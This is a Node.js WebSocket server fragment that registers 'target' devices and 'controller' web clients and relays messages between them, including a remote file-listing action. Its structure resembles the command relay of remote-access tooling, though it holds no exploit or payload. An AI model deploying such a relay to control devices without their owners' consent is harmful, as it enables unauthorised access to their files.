wss.on('connection', (ws) => {
    let clientType = 'UNKNOWN';

    ws.on('message', (message) => {
        const rawText = message.toString();
        console.log('RAW MESSAGE RECEIVED:', rawText); // <-- This will show us everything!

        try {
            const data = JSON.parse(rawText);

            if (data.type === 'REGISTER_TARGET' || data.role === 'target') {
                clientType = 'TARGET';
                targets.add(ws);
                console.log('Target Device registered successfully. Total targets:', targets.size);
                broadcastStatus();
                ws.send(JSON.stringify({ status: 'SUCCESS', role: 'TARGET' }));
                return;
            }

            if (data.type === 'REGISTER_CONTROLLER' || data.role === 'controller') {
                clientType = 'CONTROLLER';
                controllers.add(ws);
                console.log('Web Controller connected. Total controllers:', controllers.size);
                ws.send(JSON.stringify({ status: 'TARGET_STATUS', online: targets.size > 0 }));
                return;
            }

            // Route Controller -> Target
            if (clientType === 'CONTROLLER') {
                if (targets.size > 0) {
                    const targetArr = Array.from(targets);
                    const activeTarget = targetArr[targetArr.length - 1];
                    if (activeTarget.readyState === WebSocket.OPEN) {
                        activeTarget.send(JSON.stringify(data));
                    }
                } else {
                    ws.send(JSON.stringify({ action: 'FILE_LIST', files: ['ERROR: Target device is offline.'] }));
                }
            }

            // Route Target -> All Controllers
            else if (clientType === 'TARGET') {
                controllers.forEach(ctrl => {
                    if (ctrl.readyState === WebSocket.OPEN) {
                        ctrl.send(JSON.stringify(data));
                    }
                });
            }
        } catch (err) {
            console.error('Error handling message:', err.message);
        }
    });

    ws.on('close', () => {
        if (clientType === 'TARGET') {
            targets.delete(ws);
            console.log('Target Device disconnected. Remaining targets:', targets.size);
            broadcastStatus();
        } else if (clientType === 'CONTROLLER') {
            controllers.delete(ws);
            console.log('Web Controller disconnected.');
        }
    });
});
